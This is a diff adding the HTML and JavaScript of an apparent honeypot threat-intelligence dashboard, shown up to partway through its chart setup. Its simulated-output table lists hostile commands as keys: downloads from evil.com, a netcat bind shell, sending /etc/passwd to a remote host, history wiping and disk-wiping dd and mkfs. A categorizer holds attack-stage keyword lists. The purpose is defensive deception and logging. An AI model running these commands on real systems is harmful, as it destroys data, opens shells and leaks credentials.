@@ -1,0 +1,570 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CYPHERTRACE | GLOBAL THREAT INTELLIGENCE</title>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <style>
+        :root {
+            --bg-primary: #0d1117;
+            --bg-secondary: #161b22;
+            --bg-tertiary: #21262d;
+            --text-primary: #c9d1d9;
+            --text-secondary: #8b949e;
+            --border-color: #30363d;
+            --accent-green: #238636;
+            --accent-orange: #d18616;
+            --accent-blue: #1f6feb;
+            --accent-yellow: #b76a00;
+            --accent-red: #da3633;
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background-color: var(--bg-primary); color: var(--text-primary); font-family: 'Courier New', monospace; line-height: 1.6; }
+        .container { max-width: 1400px; margin: 0 auto; padding: 20px; display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; }
+        header { grid-column: 1 / -1; text-align: center; padding: 20px 0; border-bottom: 1px solid var(--border-color); margin-bottom: 20px; }
+        header h1 { font-size: 2.5em; letter-spacing: 5px; color: var(--accent-green); text-shadow: 0 0 10px var(--accent-green); }
+        header p { font-size: 1.2em; color: var(--text-secondary); letter-spacing: 2px; }
+        .card { background-color: var(--bg-secondary); border: 1px solid var(--border-color); border-radius: 8px; padding: 20px; box-shadow: 0 4px 12px rgba(0,0,0,0.5); }
+        .card h2 { font-size: 1.3em; margin-bottom: 15px; color: var(--accent-green); border-bottom: 1px solid var(--border-color); padding-bottom: 10px; }
+        #map { height: 400px; border-radius: 10px; border: 1px solid var(--border-color); }
+        .stat-item { background-color: var(--bg-tertiary); padding: 12px; border-radius: 6px; margin-bottom: 10px; border-left: 4px solid var(--accent-blue); }
+        .chart-container { position: relative; height: 250px; margin-top: 20px; }
+        #live-feed { max-height: 400px; overflow-y: auto; background-color: var(--bg-tertiary); border-radius: 6px; padding: 15px; font-family: monospace; font-size: 0.9em; }
+        .log-entry { padding: 8px; margin-bottom: 5px; border-left: 3px solid var(--border-color); background-color: var(--bg-primary); border-radius: 4px; }
+        .log-entry.web_probe { border-left-color: var(--accent-green); }
+        .log-entry.web_login_attempt { border-left-color: var(--accent-orange); }
+        .log-entry.connection_established { border-left-color: var(--accent-blue); }
+        .log-entry.login_attempt { border-left-color: var(--accent-yellow); }
+        .log-entry.command_executed { border-left-color: var(--accent-red); }
+        .filter-bar { display: flex; gap: 10px; margin-bottom: 15px; flex-wrap: wrap; }
+        .filter-bar input { flex: 1; min-width: 250px; padding: 10px; background-color: var(--bg-tertiary); border: 1px solid var(--border-color); color: var(--text-primary); border-radius: 6px; font-family: var(--font-body); }
+        .filter-bar button { padding: 10px 20px; background-color: var(--accent-blue); color: white; border: none; border-radius: 6px; cursor: pointer; font-family: var(--font-body); font-weight: bold; }
+        .filter-bar button:hover { background-color: var(--text-primary); }
+        .event-limit { display: flex; align-items: center; gap: 10px; color: var(--text-secondary); font-size: 0.9em; }
+        .event-limit select { padding: 5px; background-color: var(--bg-tertiary); border: 1px solid var(--border-color); color: var(--text-primary); border-radius: 4px; }
+        .terminal-output { margin-top: 15px; padding-top: 15px; border-top: 1px solid var(--border-color); }
+        .terminal-output h3 { font-family: var(--font-header); font-size: 1em; color: var(--text-secondary); margin-top: 0; }
+        .terminal-window { background-color: #000; border-radius: 6px; padding: 10px; font-family: monospace; font-size: 0.9em; color: #0f0; max-height: 200px; overflow-y: auto; }
+        .command-category { color: var(--accent-orange); font-weight: bold; }
+        .command-line { margin-bottom: 5px; }
+        .command-output { color: #ccc; margin-bottom: 10px; white-space: pre-wrap; }
+        .event-name { font-weight: bold; color: var(--accent-blue); }
+        .event-count { float: right; background-color: var(--bg-tertiary); padding: 2px 8px; border-radius: 4px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>CYPHERTRACE</h1>
+            <p>GLOBAL THREAT INTELLIGENCE DASHBOARD</p>
+        </header>
+
+        <div class="card" style="grid-column: 1 / -1;">
+            <h2>FILTER</h2>
+            <div class="filter-bar">
+                <input type="text" id="search-input" placeholder="Filter by IP or event type (e.g., web_probe, 127.0.0.1)">
+                <div class="event-limit">
+                    <label for="limit-select">Show:</label>
+                    <select id="limit-select">
+                        <option value="100">Last 100 events</option>
+                        <option value="500">Last 500 events</option>
+                        <option value="1000" selected>Last 1000 events</option>
+                        <option value="5000">Last 5000 events</option>
+                        <option value="10000">Last 10,000 events</option>
+                        <option value="20000">Last 20,000 events</option>
+                    </select>
+                </div>
+                <button onclick="clearFilter()">Clear</button>
+            </div>
+        </div>
+
+        <section class="card">
+            <h2>ATTACK ORIGINS</h2>
+            <div id="map"></div>
+        </section>
+
+        <section class="card">
+            <h2>THREAT ANALYSIS <span id="analysis-scope" style="font-size:0.7em; color: var(--text-secondary);"></span></h2>
+            <div id="stats-grid">
+                <div class="stat-item"><strong>Total Events:</strong> <span id="total-attacks">0</span></div>
+                <div class="stat-item"><strong>Unique Sources:</strong> <span id="unique-ips">0</span></div>
+                <div class="stat-item"><strong>Top Source IP:</strong> <span id="top-attacker">-</span></div>
+                <div class="stat-item"><strong>Top Source Country:</strong> <span id="top-country">-</span></div>
+                <div class="stat-item" style="grid-column: 1 / -1;"><strong>Most Common Command:</strong> <span id="common-command">-</span></div>
+            </div>
+            
+            <div id="ip-specific-events" style="display: none;">
+                <h3>Top Events for this IP</h3>
+                <ul id="event-list"></ul>
+            </div>
+
+            <div class="chart-container">
+                <canvas id="eventTypeChart"></canvas>
+            </div>
+        </section>
+
+        <section class="card" style="grid-column: 1 / -1;">
+            <h2>ATTACK VOLUME TIMELINE</h2>
+            <div class="chart-container" style="height: 300px;">
+                <canvas id="timelineChart"></canvas>
+            </div>
+        </section>
+
+        <section class="card" style="grid-column: 1 / -1;">
+            <h2>EVENT STREAM</h2>
+            <div id="live-feed"><div class="log-entry">> PENDING DATA...</div></div>
+        </section>
+
+        <section class="card" style="grid-column: 1 / -1; display: none;" id="terminal-output-section">
+            <h2>TERMINAL OUTPUT <span id="terminal-scope" style="font-size:0.7em; color: var(--text-secondary);"></span></h2>
+            <div class="terminal-window" id="terminal-output"></div>
+        </section>
+    </div>
+
+    <script>
+        const API_URL = "http://127.0.0.1:5001/api/logs";
+        const ANALYSIS_URL = "http://127.0.0.1:5001/api/analysis";
+        let allLogs = [];
+        let map, eventTypeChart, timelineChart;
+
+        // Simulated command outputs
+        const commandOutputs = {
+            "hostname": "attacker-pc",
+            "arch": "x86_64",
+            "uname -m": "x86_64",
+            "lscpu": "Architecture:        x86_64\nCPU op-mode(s):      32-bit, 64-bit\nByte Order:          Little Endian\nCPU(s):              4\nOn-line CPU(s) list: 0-3\nThread(s) per core:  1\nCore(s) per socket:  1\nSocket(s):           4\nNUMA node(s):        1\nVendor ID:           GenuineIntel\nCPU family:          6\nModel:               142\nModel name:          Intel(R) Core(TM) i7-7500U CPU @ 2.70GHz\nStepping:            9\nCPU MHz:             2904.002\nBogoMIPS:            5808.00\nHypervisor vendor:   KVM\nVirtualization type: full\nL1d cache:           32K\nL1i cache:           32K\nL2 cache:            256K\nL3 cache:            4096K\nNUMA node0 CPU(s):   0-3",
+            "df -h": "Filesystem      Size  Used Avail Use% Mounted on\n/dev/sda1        20G   12G  7.2G  63% /\ntmpfs           1.9G     0  1.9G   0% /dev/shm",
+            "free -h": "              total        used        free      shared  buff/cache   available\nMem:          1.9Gi       1.1Gi       256Mi       1.0Mi       512Mi       650Mi\nSwap:         2.0Gi          0B       2.0Gi",
+            "uptime": " 10:30:45 up 5 days,  2:15,  1 user,  load average: 0.15, 0.25, 0.20",
+            "w": " 10:30:45 up 5 days,  2:15,  1 user,  load average: 0.15, 0.25, 0.20\nUSER     TTY      FROM           LOGIN@   IDLE   JCPU   PCPU WHAT\nroot     pts/0    192.168.1.100  08:15    1.00s  0.42s  0.10s -bash",
+            "who": "root     pts/0        2023-11-15 08:15 (192.168.1.100)",
+            "last": "root     pts/0        192.168.1.100   Wed Nov 15 08:15   still logged in\nreboot   system boot  5.4.0-42-generic Wed Nov 10 06:30   still running",
+            "lastlog": "Username         Port     From             Latest\nroot             pts/0    192.168.1.100   Wed Nov 15 08:15:30 +0000 2023",
+            "ip a": "1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000\n    link/ether 08:00:27:7c:58:54 brd ff:ff:ff:ff:ff:ff\n    inet 10.0.2.15/24 brd 10.0.2.255 scope global eth0\n       valid_lft forever preferred_lft forever",
+            "ifconfig": "eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255\n        inet6 fe80::a00:27ff:fe7c:5854  prefixlen 64  scopeid 0x20<link>\n        ether 08:00:27:7c:58:54  txqueuelen 1000  (Ethernet)\n        RX packets 12345  bytes 1234567 (1.2 MB)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 54321  bytes 9876543 (9.8 MB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0",
+            "ss -tulpn": "Netid  State      Recv-Q Send-Q Local Address:Port  Peer Address:Port\nudp    UNCONN     0      0      127.0.0.1:53       0.0.0.0:*    users:((\"dnsmasq\",pid=1234,fd=3))\ntcp    LISTEN     0      128      0.0.0.0:22       0.0.0.0:*    users:((\"sshd\",pid=5678,fd=3))",
+            "arp -a": "? (10.0.2.2) at 52:54:00:12:35:02 [ether] on eth0\n? (192.168.1.1) at 00:1a:2b:3c:4d:5e [ether] on eth1",
+            "route": "Kernel IP routing table\nDestination     Gateway         Genmask         Flags Metric Ref    Use Iface\n0.0.0.0         10.0.2.2       0.0.0.0         UG    100    0        0 eth0\n10.0.2.0        0.0.0.0         255.255.255.0   U     100    0        0 eth0",
+            "top": "top - 10:30:45 up 5 days,  2:15,  1 user,  load average: 0.15, 0.25, 0.20\nTasks:  95 total,   1 running,  94 sleeping,   0 stopped,   0 zombie\n%Cpu(s):  5.0 us,  2.0 sy,  0.0 ni, 92.0 id,  1.0 wa,  0.0 hi,  0.0 si,  0.0 st\nMiB Mem :   1945.2 total,    256.4 free,   1123.5 used,    565.3 buff/cache\nMiB Swap:   2048.0 total,   2048.0 free,      0.0 used.   1723.7 avail Mem",
+            "find / -name \"*.conf\"": "/etc/ssh/sshd.conf\n/etc/nginx/nginx.conf\n/etc/mysql/my.cnf\n/etc/apache2/apache2.conf",
+            "find / -perm -4000": "/usr/bin/sudo\n/usr/bin/passwd\n/usr/bin/gpasswd\n/usr/bin/chsh\n/usr/bin/newgrp\n/usr/bin/chfn\n/usr/sbin/pam_timestamp_check\n/usr/sbin/unix_chkpwd",
+            "ls -R": ".:\nfile1.txt  file2.log  dir1\n\n./dir1:\nsubfile1.dat  subfile2.cfg",
+            "dir": "file1.txt  file2.log  dir1",
+            "cat /etc/crontab": "# /etc/crontab: system-wide crontab\nSHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n# m h dom mon dow user  command\n17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly\n25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )\n47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )\n52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )",
+            "crontab -l": "# Edit this file to introduce tasks to be run by cron.\n# \n# Each task to run has to be defined through a single line\n# indicating with different fields when the task will be run\n# and what command to run for the task\n# \n# To define the time you can provide concrete values for\n# minute (m), hour (h), day of month (dom), month (mon),\n# and day of week (dow) or use '*' in these fields (for 'any').\n# \n# Notice that tasks will be started based on the cron's system\n# daemon's notion of time and timezones.\n# \n# Output of the crontab jobs (including errors) is sent through\n# email to the user the crontab file belongs to (unless redirected).\n# \n# For example, you can run a backup of all your user accounts\n# at 5 a.m every week with:\n# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/\n# \n# For more information see the manual pages of crontab(5) and cron(8)\n# \n# m h  dom mon dow   command\n0 5 * * 1 /path/to/script.sh",
+            "systemctl list-units --type=service --state=running": "UNIT                            LOAD   ACTIVE SUB     DESCRIPTION\naccounts-daemon.service         loaded active running Accounts Service\napache2.service                 loaded active running The Apache HTTP Server\ncron.service                    loaded active running Regular background program processing daemon\ndbus.service                    loaded active running D-Bus System Message Bus\ndnsmasq.service                 loaded active running DNS caching server.\ngetty@tty1.service              loaded active running Getty on tty1\nnetworkd-dispatcher.service     loaded active running Dispatcher daemon for systemd-networkd\nrsyslog.service                 loaded active running System Logging Service\nssh.service                     loaded active running OpenBSD Secure Shell server\nsystemd-journald.service        loaded active running Journal Service\nsystemd-logind.service          loaded active running Login Service\nsystemd-networkd.service        loaded active running Network Service\nsystemd-udevd.service           loaded active running udev Kernel Device Manager\nufw.service                     loaded active running Uncomplicated Firewall\nuser@1000.service               loaded active running User Manager for UID 1000",
+            "service --status-all": " [ + ]  apache2\n [ - ]  bootmisc.sh\n [ + ]  cron\n [ - ]  dns-clean\n [ + ]  dnsmasq\n [ - ]  grub-common\n [ ? ]  hwclock.sh\n [ - ]  killprocs\n [ ? ]  networking\n [ - ]  procps\n [ + ]  rsyslog\n [ - ]  sendmail\n [ + ]  ssh\n [ + ]  udev\n [ + ]  ufw",
+            "sudo -l": "Matching Defaults entries for root on localhost:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser root may run the following commands on localhost:\n    (ALL : ALL) ALL",
+            "sudo su": "root@localhost:~#",
+            "sudo bash": "root@localhost:~#",
+            "cat ~/.ssh/authorized_keys": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3examplekey1234567890 user@attacker-pc",
+            "ssh-keygen": "Generating public/private rsa key pair.\nEnter file in which to save the key (/root/.ssh/id_rsa): \nCreated directory '/root/.ssh'.\nEnter passphrase (empty for no passphrase): \nEnter same passphrase again: \nYour identification has been saved in /root/.ssh/id_rsa.\nYour public key has been saved in /root/.ssh/id_rsa.pub.\nThe key fingerprint is:\nSHA256:AbCdEfGhIjKlMnOpQrStUvWxYz1234567890 root@localhost\nThe key's randomart image is:\n+---[RSA 2048]----+\n|      .          |\n|     . .         |\n|    .   .        |\n|   .     .       |\n|  .       .      |\n| .         .     |\n|  .         .    |\n|   .         .   |\n|    .         .  |\n+----[SHA256]-----+",
+            "useradd -m -s /bin/bash newuser": "",
+            "cat /etc/hosts": "127.0.0.1   localhost\n127.0.1.1   localhost\n\n# The following lines are desirable for IPv6 capable hosts\n::1     ip6-localhost ip6-loopback\nfe00::0 ip6-localnet\nff00::0 ip6-mcastprefix\nff02::1 ip6-allnodes\nff02::2 ip6-allrouters",
+            "cat /etc/resolv.conf": "# This file is managed by man:systemd-resolved(8). Do not edit.\n#\n# This is a dynamic resolv.conf file for connecting local clients to the\n# internal DNS stub resolver of systemd-resolved. This file lists all\n# configured search domains.\n#\n# Run \"resolvectl status\" to see details about the uplink DNS servers\n# currently in use.\n#\n# Third party programs must not access this file directly, but only through the\n# symlink at /etc/resolv.conf. To manage man:resolv.conf(5) in a different way,\n# replace this symlink by a static file or a different symlink.\n#\n# See man:systemd-resolved.service(8) for details about the supported modes of\n# operation for /etc/resolv.conf.\n\nnameserver 127.0.0.53\noptions edns0 trust-ad\nsearch .",
+            "passwd": "New password: \nRetype new password: \npasswd: password updated successfully",
+            "su": "root@localhost:~#",
+            "wget http://evil.com/malware.sh": "--2023-11-15 10:30:45--  http://evil.com/malware.sh\nResolving evil.com (evil.com)... 93.184.216.34\nConnecting to evil.com (evil.com)|93.184.216.34|:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 1234 (1.2K) [application/x-sh]\nSaving to: 'malware.sh'\n\n     0K .                                                     100%  1.23M=0s\n\n2023-11-15 10:30:45 (1.23 MB/s) - 'malware.sh' saved [1234/1234]",
+            "curl http://evil.com/malware.py": "#!/usr/bin/env python3\nimport os\nimport subprocess\n\n# Malicious Python script\nprint('Executing malicious payload...')\nsubprocess.run(['rm', '-rf', '/'], check=False)",
+            "nc -l -p 4444 -e /bin/bash": "",
+            "python -c 'import pty; pty.spawn(\"/bin/bash\")'": "root@localhost:~#",
+            "perl -e 'system(\"/bin/bash\")'": "root@localhost:~#",
+            "apt-get install nmap": "Reading package lists... Done\nBuilding dependency tree... Done\nReading state information... Done\nThe following NEW packages will be installed:\n  nmap\n0 upgraded, 1 newly installed, 0 to remove and 0 not upgraded.\nNeed to get 4,234 kB of archives.\nAfter this operation, 15.2 MB of additional disk space will be used.\nGet:1 http://archive.ubuntu.com/ubuntu jammy/main amd64 nmap amd64 7.80+dfsg1-2build1 [4,234 kB]\nFetched 4,234 kB in 1s (4,234 kB/s)\nSelecting previously unselected package nmap.\n(Reading database ... 123456 files and directories currently installed.)\nPreparing to unpack .../nmap_7.80+dfsg1-2build1_amd64.deb ...\nUnpacking nmap (7.80+dfsg1-2build1) ...\nSetting up nmap (7.80+dfsg1-2build1) ...\nProcessing triggers for man-db (2.10.2-1) ...",
+            "yum install wireshark": "Loaded plugins: fastestmirror, ovl\nLoading mirror speeds from cached hostfile\n * base: mirror.centos.org\n * extras: mirror.centos.org\n * updates: mirror.centos.org\nResolving Dependencies\n--> Running transaction check\n---> Package wireshark.x86_64 0:1.10.14-25.el7 will be installed\n--> Finished Dependency Resolution\n\nDependencies Resolved\n\n================================================================================\n Package         Arch        Version                   Repository        Size\n================================================================================\nInstalling:\n wireshark      x86_64      1.10.14-25.el7            base             12 M\n\nTransaction Summary\n================================================================================\nInstall  1 Package\n\nTotal download size: 12 M\nInstalled size: 35 M\nIs this ok [y/d/N]: y\nDownloading packages:\nwireshark-1.10.14-25.el7.x86_64.rpm                      |  12 MB  00:00:01     \nRunning transaction check\nRunning transaction test\nTransaction test succeeded\nRunning transaction\n  Installing : wireshark-1.10.14-25.el7.x86_64                              1/1 \n  Verifying  : wireshark-1.10.14-25.el7.x86_64                              1/1 \n\nInstalled:\n  wireshark.x86_64 0:1.10.14-25.el7                                             \n\nComplete!",
+            "chmod +x malware.sh": "",
+            "tar -czvf backup.tar.gz /var/www": "tar: Removing leading `/' from member names\n/var/www/\n/var/www/html/\n/var/www/html/index.html\n/var/www/html/style.css\n/var/www/html/script.js",
+            "nc 10.10.10.10 1234 < /etc/passwd": "",
+            "history -c": "",
+            "> ~/.bash_history": "",
+            "dd if=/dev/zero of=/dev/sda": "dd: writing to '/dev/sda': No space left on device\n2048000+0 records in\n2048000+0 records out\n1048576000 bytes (1.0 GB) copied, 12.3456 s, 84.9 MB/s",
+            "rm -rf / --no-preserve-root": "rm: it is dangerous to operate recursively on '/'\nrm: use --no-preserve-root to override this failsafe",
+            "mkfs.ext4 /dev/sda1": "mke2fs 1.45.5 (07-Jan-2020)\nCreating filesystem with 262144 4k blocks and 65536 inodes\nFilesystem UUID: 12345678-1234-1234-1234-1234567890ab\nSuperblock backups stored on blocks: \n\t32768, 98304, 163840, 229376\n\nAllocating group tables: done                            \nWriting inode tables: done                            \nCreating journal (8192 blocks): done\nWriting superblocks and filesystem accounting information: done",
+            "cls": "Command 'cls' not found, but there are 18 similar ones",
+            "sl": "     _____ \n    /     |\n   __/__|__   __   __   __   __\n  /  |    | | |  | | | |  | |\n /   |    | | |  | | | |  | |\n|    |    | | |  | | | |  | |\n \\___|____| |_|  |_| |_|  |_|",
+            "clear": "",
+            "cd..": "bash: cd..: command not found",
+            "man sudo": "SUDO(1)                        General Commands Manual                       SUDO(1)\n\nNAME\n       sudo - execute a command as another user\n\nSYNOPSIS\n       sudo -h | -K | -k | -V\n       sudo -v [-AknS] [-g group] [-h host] [-p prompt] [-u user]\n       sudo -l [-AknS] [-g group] [-h host] [-p prompt] [-U user] [-u user]\n               [command]\n       sudo [-AbEHnPS] [-C num] [-g group] [-h host] [-p prompt] [-r role]\n               [-t type] [-u user] [VAR=value] [-i|-s] [<command>]\n       sudo -e [-AknS] [-C num] [-g group] [-h host] [-p prompt] [-r role]\n               [-t type] [-u user] file [...]",
+            "echo $PATH": "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+        };
+
+        function getCommandOutput(command) {
+            // Return exact match if available
+            if (commandOutputs[command]) {
+                return commandOutputs[command];
+            }
+            
+            // Check for partial matches
+            for (const cmd in commandOutputs) {
+                if (command.includes(cmd) || cmd.includes(command)) {
+                    return commandOutputs[cmd];
+                }
+            }
+            
+            // Default outputs for unknown commands
+            if (command.includes('rm')) {
+                return "rm: cannot remove 'file': No such file or directory";
+            } else if (command.includes('cat')) {
+                return "cat: file: No such file or directory";
+            } else if (command.includes('ls')) {
+                return "file1.txt  file2.log  directory";
+            } else if (command.includes('ps')) {
+                return "  PID TTY          TIME CMD\n 1234 pts/0    00:00:01 bash\n 5678 pts/0    00:00:00 ps";
+            } else if (command.includes('netstat')) {
+                return "Active Internet connections (only servers)\nProto Recv-Q Send-Q Local Address           Foreign Address         State      \ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     \ntcp        0      0 127.0.0.1:53            0.0.0.0:*               LISTEN";
+            } else if (command.includes('find')) {
+                return "file1.txt\nfile2.log\n/etc/ssh/sshd_config";
+            } else if (command.includes('grep')) {
+                return "file1.txt:password\nfile2.log:admin";
+            } else if (command.includes('chmod')) {
+                return "";
+            } else if (command.includes('chown')) {
+                return "";
+            } else if (command.includes('kill')) {
+                return "";
+            } else if (command.includes('ping')) {
+                return "PING target.com (93.184.216.34) 56(84) bytes of data.\n64 bytes from target.com (93.184.216.34): icmp_seq=1 ttl=54 time=12.3 ms";
+            } else if (command.includes('nslookup')) {
+                return "Server:         127.0.0.53\nAddress:        127.0.0.53#53\n\nNon-authoritative answer:\nName:   target.com\nAddress: 93.184.216.34";
+            } else if (command.includes('nmap')) {
+                return "Starting Nmap 7.80 ( https://nmap.org ) at 2023-11-15 10:30 UTC\nNmap scan report for target.com (93.184.216.34)\nHost is up (0.12s latency).\nNot shown: 998 closed ports\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\nNmap done: 1 IP address (1 host up) scanned in 2.34 seconds";
+            } else if (command.includes('sqlmap')) {
+                return "        ___\n       __H__\n ___ ___[.]_____ ___ ___  {1.7.5#stable}\n|_ -| . [']     | .'| . |\n|___|_  [)]_|_|_|__,|  _|\n      |_|V...       |_|   https://sqlmap.org\n\n[*] starting @ 10:30:45 /2023-11-15\n\n[10:30:45] [INFO] testing connection to the target URL\n[10:30:45] [INFO] checking if the target is protected by some kind of WAF/IPS\n[10:30:45] [INFO] testing if the target URL content is stable\n[10:30:46] [INFO] target URL content is stable\n[10:30:46] [INFO] testing if GET parameter 'id' is dynamic\n[10:30:46] [INFO] GET parameter 'id' appears to be dynamic";
+            } else if (command.includes('nikto')) {
+                return "- Nikto v2.1.6\n---------------------------------------------------------------------------\n+ Target IP:          93.184.216.34\n+ Target Hostname:    target.com\n+ Target Port:        80\n+ Start Time:         2023-11-15 10:30:45 (GMT-5)\n---------------------------------------------------------------------------\n+ Server: Apache/2.4.41\n+ The anti-clickjacking X-Frame-Options header is not present.\n+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS\n+ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.\n+ Retrieved x-powered-by header: PHP/7.4.3";
+            } else if (command.includes('wpscan')) {
+                return "_______________________________________________________________\n        __          _______   _____                  \n        \\ \\        / /  __ \\ / ____|                 \n         \\ \\  /\\  / /| |__) | (___   ___  __ _ _ __  \n          \\ \\/  \\/ / |  ___/ \\___ \\ / __|/ _` | '_ \\ \n           \\  /\\  /  | |     ____) | (__| (_| | | | |\n            \\/  \\/   |_|    |_____/ \\___|\\__,_|_| |_| \n        WordPress Security Scanner by @WPScanTeam\n       Version 3.8.20 @ Sponsored by Automattic - https://automattic.com/\n       @_WPScan_\n_______________________________________________________________\n\n[+] URL: http://target.com/blog/ [93.184.216.34]\n[+] Started: Wed Nov 15 10:30:45 2023\n\nInteresting Finding(s):\n\n[+] Headers\n | Interesting Entry: Server: Apache/2.4.41\n | Found By: Headers (Passive Detection)\n | Confidence: 100%\n\n[+] XML-RPC seems to be enabled: http://target.com/blog/xmlrpc.php\n | Found By: Direct Access (Aggressive Scanning)\n | Confidence: 100%\n | References:\n |  - http://codex.wordpress.org/XML-RPC_Pingback_API\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login\n |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos";
+            } else if (command.includes('tar')) {
+                return "a file1.txt\na file2.log\na directory/";
+            } else if (command.includes('scp')) {
+                return "file1.txt                          100%  123KB  123.4KB/s   00:01    \nfile2.log                           100%  456KB  456.7KB/s   00:01";
+            } else if (command.includes('mail')) {
+                return "Mail sent successfully.";
+            } else if (command.includes('tail')) {
+                return "192.168.1.100 - - [15/Nov/2023:10:30:45 +0000] \"POST /login HTTP/1.1\" 200 1234 \"http://target.com/login\" \"Mozilla/5.0\"";
+            } else if (command.includes('echo')) {
+                return command.replace('echo ', '');
+            } else if (command.includes('wget') || command.includes('curl')) {
+                return "Download completed successfully.";
+            } else if (command.includes('python') || command.includes('perl')) {
+                return "Script executed successfully.";
+            } else if (command.includes('systemctl') || command.includes('service')) {
+                return "Operation completed successfully.";
+            } else if (command.includes('useradd') || command.includes('passwd')) {
+                return "User operation completed successfully.";
+            } else if (command.includes('crontab')) {
+                return "Crontab updated successfully.";
+            } else if (command.includes('dd')) {
+                return "Operation completed successfully.";
+            } else {
+                return "Command executed successfully.";
+            }
+        }
+
+        // HELPER FUNCTION: Formats date and time into a clean string
+        function formatDateTime(timestamp) {
+            const date = new Date(timestamp);
+            const year = date.getFullYear();
+            const month = String(date.getMonth() + 1).padStart(2, '0');
+            const day = String(date.getDate()).padStart(2, '0');
+            const hours = String(date.getHours()).padStart(2, '0');
+            const minutes = String(date.getMinutes()).padStart(2, '0');
+            const seconds = String(date.getSeconds()).padStart(2, '0');
+            return `${year}-${month}-${day} ${hours}:${minutes}:${seconds}`;
+        }
+
+        function isIpAddress(searchTerm) {
+            const ipRegex = /^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
+            return ipRegex.test(searchTerm);
+        }
+
+        // Categorize commands based on their purpose
+        function categorizeCommand(command) {
+            const reconnaissanceCommands = [
+                'hostname', 'arch', 'uname', 'lscpu', 'df', 'free', 'uptime', 'w', 'who', 
+                'last', 'lastlog', 'ip', 'ifconfig', 'ss', 'arp', 'route', 'top', 'htop',
+                'find', 'ls', 'dir', 'cat', 'pwd', 'ps', 'netstat'
+            ];
+            
+            const privilegeEscalationCommands = [
+                'sudo', 'su', 'cat /etc/crontab', 'crontab', 'systemctl', 'service'
+            ];
+            
+            const persistenceCommands = [
+                'ssh-keygen', 'useradd', 'cat ~/.ssh/authorized_keys', 'passwd', 'cat /etc/hosts',
+                'cat /etc/resolv.conf'
+            ];
+            
+            const downloadCommands = [
+                'wget', 'curl', 'nc', 'python', 'perl', 'apt-get', 'yum', 'chmod', 'pip'
+            ];
+            
+            const exfiltrationCommands = [
+                'tar', 'nc', 'rm', 'history', 'dd'
+            ];
+            
+            // Check if command contains any of the keywords
+            const commandLower = command.toLowerCase();
+            
+            if (reconnaissanceCommands.some(cmd => commandLower.includes(cmd))) {
+                return 'Reconnaissance & Enumeration';
+            } else if (privilegeEscalationCommands.some(cmd => commandLower.includes(cmd))) {
+                return 'Privilege Escalation';
+            } else if (persistenceCommands.some(cmd => commandLower.includes(cmd))) {
+                return 'Persistence & Lateral Movement';
+            } else if (downloadCommands.some(cmd => commandLower.includes(cmd))) {
+                return 'Downloading Tools & Scripting';
+            } else if (exfiltrationCommands.some(cmd => commandLower.includes(cmd))) {
+                return 'Exfiltration & Destruction';
+            } else {
+                return 'Other';
+            }
+        }
+
+        function initMap() {
+            map = L.map('map').setView([20, 0], 2);
+            L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
+                attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors &copy; <a href="https://carto.com/attributions">CARTO</a>',
+                subdomains: 'abcd', maxZoom: 19
+            }).addTo(map);
+        }
+        
+        function initCharts() {
+            const ctxEvent = document.getElementById('eventTypeChart').getContext('2d');
+            eventTypeChart = new Chart(ctxEvent, {
+                type: 'doughnut', 
+                data: { 
+                    labels: ['Web Probes', 'Web Login Attempts', 'Connections', 'Login Attempts', 'Commands'], 
+                    datasets: [{ 
+                        label: 'Event Types', 
+                        data: [0, 0, 0, 0, 0], 
+                        backgroundColor: [ '#238636', '#d18616', '#1f6feb', '#b76a00', '#da3633' ], 
+                        borderWidth: 0 
+                    }] 
+                },
